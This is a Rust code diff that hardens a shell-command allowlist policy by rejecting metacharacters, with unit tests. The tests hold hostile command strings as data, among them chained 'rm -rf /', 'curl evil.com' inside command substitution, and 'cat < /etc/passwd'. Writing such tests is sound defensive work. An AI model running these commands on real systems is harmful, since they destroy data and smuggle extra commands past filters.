@@ -27,6 +27,14 @@ pub enum ShellPolicy {
     Unrestricted,
 }
 
+/// Check if a shell command string contains metacharacters that could
+/// bypass the allowlist by chaining multiple commands or performing
+/// command substitution/redirection.
+fn has_shell_metacharacters(cmd_str: &str) -> bool {
+    let metachars = [';', '&', '|', '`', '$', '>', '<', '\n'];
+    cmd_str.contains(metachars)
+}
+
 impl ShellPolicy {
     /// Check if a given shell command string is allowed under this policy.
     /// Returns Ok(()) if allowed, Err(reason) if blocked.
@@ -34,6 +42,13 @@ impl ShellPolicy {
         match self {
             ShellPolicy::Disabled => Err("Shell commands are disabled by policy".to_string()),
             ShellPolicy::AllowList(allowed) => {
+                // Reject shell metacharacters that would allow bypassing the allowlist
+                if has_shell_metacharacters(cmd_str) {
+                    return Err(format!(
+                        "Command contains shell metacharacters that are not permitted in allowlist mode: '{}'",
+                        cmd_str
+                    ));
+                }
                 let base_cmd = extract_base_command(cmd_str);
                 if allowed.contains(&base_cmd) {
                     Ok(())
@@ -204,10 +219,55 @@ mod tests {
     }
 
     #[test]
-    fn test_shell_policy_unrestricted() {
+    fn test_has_shell_metacharacters() {
+        assert!(!has_shell_metacharacters("git status"));
+        assert!(!has_shell_metacharacters("ls -la"));
+        assert!(has_shell_metacharacters("git status; rm -rf /"));
+        assert!(has_shell_metacharacters("ls && whoami"));
+        assert!(has_shell_metacharacters("ls || whoami"));
+        assert!(has_shell_metacharacters("echo `id`"));
+        assert!(has_shell_metacharacters("echo $(whoami)"));
+        assert!(has_shell_metacharacters("ls | whoami"));
+        assert!(has_shell_metacharacters("echo foo > /tmp/bar"));
+        assert!(has_shell_metacharacters("cat < /etc/passwd"));
+        assert!(has_shell_metacharacters("cmd\nother_cmd"));
+    }
+
+    #[test]
+    fn test_allowlist_rejects_metacharacters() {
+        let allowed: HashSet<String> = vec!["git", "ls", "pwd"]
+            .into_iter()
+            .map(String::from)
+            .collect();
+        let policy = ShellPolicy::AllowList(allowed);
+
+        // Base command is allowed but metacharacters present → rejected
+        assert!(policy.check("git status; rm -rf /").is_err());
+        assert!(policy.check("ls && whoami").is_err());
+        assert!(policy.check("pwd || curl evil.com").is_err());
+        assert!(policy.check("git | whoami").is_err());
+        assert!(policy.check("ls `whoami`").is_err());
+        assert!(policy.check("git $(curl evil.com)").is_err());
+        assert!(policy.check("ls > /tmp/foo").is_err());
+        assert!(policy.check("cat < /etc/passwd").is_err());
+        assert!(policy.check("git\nrm -rf /").is_err());
+
+        // Normal allowed commands still work
+        assert!(policy.check("git status").is_ok());
+        assert!(policy.check("ls -la").is_ok());
+
+        // Blocked commands still blocked
+        assert!(policy.check("rm -rf /").is_err());
+    }
+
+    #[test]
+    fn test_unrestricted_does_not_check_metacharacters() {
         let policy = ShellPolicy::Unrestricted;
+        // Unrestricted allows everything, even with metacharacters
         assert!(policy.check("anything").is_ok());
         assert!(policy.check("rm -rf /").is_ok());
+        assert!(policy.check("ls; whoami").is_ok());
+        assert!(policy.check("ls && whoami").is_ok());
     }
 
     #[test]
